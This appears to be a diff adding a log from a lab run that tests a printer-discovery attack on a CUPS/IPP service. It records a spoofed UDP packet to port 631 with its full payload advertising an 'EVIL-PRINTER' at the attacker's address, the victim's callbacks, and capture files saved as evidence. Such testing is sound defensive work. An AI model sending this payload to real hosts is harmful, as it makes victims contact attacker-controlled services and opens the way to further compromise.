@@ -1,0 +1,9 @@
+2026-11-15 13:46:45,370 INFO IPP callback listener up on 10.13.37.66:16313
+2026-11-15 13:46:45,672 INFO [spoofed] sending UDP 10.13.37.20:0 -> 10.13.37.10:631 (95 bytes) src_spoofed=True
+2026-11-15 13:46:45,672 DEBUG payload: b'0 3 ipp://10.13.37.66:16313/printers/EVIL-PRINTER "Attacker Controlled" "Totally Legit Printer"'
+2026-11-15 13:46:45,726 WARNING >>> VICTIM CALLBACK: 10.13.37.10 connected and issued Get-Printer-Attributes (request-id=98) <<<
+2026-11-15 13:46:45,734 WARNING >>> VICTIM CALLBACK: 10.13.37.10 connected and issued Get-Printer-Attributes (request-id=99) <<<
+2026-11-15 13:46:45,736 INFO waiting up to 5s for the victim to connect back...
+2026-11-15 13:46:51,296 INFO wrote 25 packets to /lab/pcap_files/attack_variant3_spoofed.pcap
+2026-11-15 13:46:51,296 WARNING RESULT: victim DID connect back to the attacker-advertised printer -- insecure discovery confirmed (2 callback event(s))
+2026-11-15 13:46:51,297 INFO wrote run summary to /lab/evidence/attack_variant3_spoofed_summary.json
